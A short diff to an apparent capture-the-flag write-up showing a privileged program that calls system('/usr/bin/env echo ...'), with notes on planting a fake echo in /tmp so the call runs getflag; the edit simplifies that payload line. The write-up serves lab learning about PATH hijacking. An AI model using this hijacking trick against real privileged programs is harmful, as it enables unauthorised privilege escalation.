@@ -18,7 +18,7 @@ return system("/usr/bin/env echo Exploit me");
 
 system have all the permission so we can change the echo to give us the password's flag
 
-`echo "/bin/sh -c 'getflag'" > /tmp/echo`
+`echo 'getflag' > /tmp/echo`
 
 we need to passe it to `/tmp/echo` because we cannot access echo
 
